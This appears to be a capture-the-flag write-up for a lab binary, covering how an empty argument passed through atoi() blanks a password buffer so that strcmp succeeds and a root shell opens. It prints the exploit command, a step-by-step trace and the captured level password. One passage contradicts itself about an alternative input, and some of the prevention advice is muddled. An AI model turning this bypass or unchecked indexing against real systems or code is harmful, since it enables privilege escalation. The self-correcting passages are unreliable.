# Bonus3 - atoi() Logic Vulnerability

## Vulnerability Type
**Logic Vulnerability** via atoi() and strcmp()

## Quick Solution

```bash
./bonus3 ""
cat /home/user/end/.pass
```

## The Vulnerability

### Code Analysis

```c
int main(int argc, char **argv) {
    FILE *file;
    char buffer[132];
    int index;
    
    file = fopen("/home/user/end/.pass", "r");
    memset(buffer, 0, 132);
    
    if (file == NULL || argc != 2) {
        return -1;
    }
    
    // Read 66 bytes from file
    fread(buffer, 1, 66, file);
    
    // Set null terminator at position 89
    buffer[89] = '\0';
    
    // Convert argv[1] to integer
    index = atoi(argv[1]);
    
    // VULNERABILITY: Set null byte at buffer[index]
    buffer[index] = '\0';
    
    // Read another 65 bytes
    fread(buffer + 66, 1, 65, file);
    
    fclose(file);
    
    // Compare buffer with argv[1]
    if (strcmp(buffer, argv[1]) == 0) {
        execl("/bin/sh", "sh", NULL);  // WIN!
    }
    else {
        puts(buffer + 66);
    }
    
    return 0;
}
```

### The Problem

The program:
1. Reads password from `/home/user/end/.pass`
2. Converts argv[1] to integer using `atoi()`
3. Sets `buffer[atoi(argv[1])] = '\0'`
4. Compares `buffer` with `argv[1]` using `strcmp()`
5. If equal, executes `/bin/sh`

**The trick**: `atoi("")` returns 0!

## Exploitation Strategy

### atoi() Behavior

```c
atoi("")     → 0
atoi("0")    → 0
atoi("abc")  → 0
atoi("123")  → 123
```

### The Exploit

```
1. Call: ./bonus3 ""
2. atoi("") returns 0
3. buffer[0] = '\0' makes buffer an empty string
4. strcmp(buffer, "") == 0 is TRUE!
5. execl("/bin/sh") executes
6. Shell spawned!
```

### Why This Works

```
buffer before: "password_from_file..."
buffer[0] = '\0'
buffer after:  "" (empty string)

strcmp("", "") == 0  ✓
```

## Step-by-Step Execution

### 1. Run the Exploit

```bash
./bonus3 ""
```

### 2. Execution Flow

```
Step 1: main() starts
  argc = 2
  argv[1] = ""

Step 2: Open file
  file = fopen("/home/user/end/.pass", "r")
  
Step 3: Read password
  fread(buffer, 1, 66, file)
  buffer = "3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c\n"

Step 4: Set null terminator
  buffer[89] = '\0'

Step 5: Convert argv[1] to integer
  index = atoi("") = 0

Step 6: Set null byte at buffer[0]
  buffer[0] = '\0'
  buffer is now: ""

Step 7: Read more data
  fread(buffer + 66, 1, 65, file)
  (doesn't matter, we already nulled buffer[0])

Step 8: Compare
  strcmp(buffer, argv[1])
  strcmp("", "")
  Returns: 0 (equal!)

Step 9: Execute shell
  execl("/bin/sh", "sh", NULL)
  Shell spawned!
```

### 3. Get Flag

```bash
cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## Alternative Solutions

### Using "0"

```bash
./bonus3 "0"
```

This also works because:
- `atoi("0")` returns 0
- `buffer[0] = '\0'`
- `strcmp("", "0")` returns non-zero
- But wait, this doesn't work!

Actually, only empty string works because:
- `strcmp("", "")` == 0 ✓
- `strcmp("", "0")` != 0 ✗

## Why This is a Vulnerability

### 1. Unchecked Array Index

```c
index = atoi(argv[1]);
buffer[index] = '\0';  // No bounds checking!
```

This allows:
- Negative indices (buffer underflow)
- Large indices (buffer overflow)
- Setting null bytes anywhere in memory

### 2. Logic Flaw

The program assumes:
- User provides a number
- That number is used as an index
- Buffer is compared with the original string

But it doesn't account for:
- Empty string input
- atoi() returning 0 for non-numeric input
- Setting buffer[0] = '\0' makes buffer empty

### 3. Predictable Behavior

```c
atoi("") always returns 0
strcmp("", "") always returns 0
```

## Security Implications

### Input Validation

```c
// VULNERABLE
index = atoi(argv[1]);
buffer[index] = '\0';

// SAFE
index = atoi(argv[1]);
if (index < 0 || index >= sizeof(buffer)) {
    return -1;
}
buffer[index] = '\0';
```

### String Comparison

```c
// VULNERABLE
if (strcmp(buffer, argv[1]) == 0) {
    execl("/bin/sh", "sh", NULL);
}

// SAFE
// Don't execute shell based on user input!
// Use proper authentication
```

## Prevention

### 1. Validate Input

```c
if (strlen(argv[1]) == 0) {
    return -1;
}

if (!isdigit(argv[1][0])) {
    return -1;
}
```

### 2. Bounds Checking

```c
index = atoi(argv[1]);
if (index < 0 || index >= sizeof(buffer)) {
    return -1;
}
```

### 3. Don't Execute Based on User Input

```c
// Never do this:
if (strcmp(user_input, password) == 0) {
    execl("/bin/sh", "sh", NULL);
}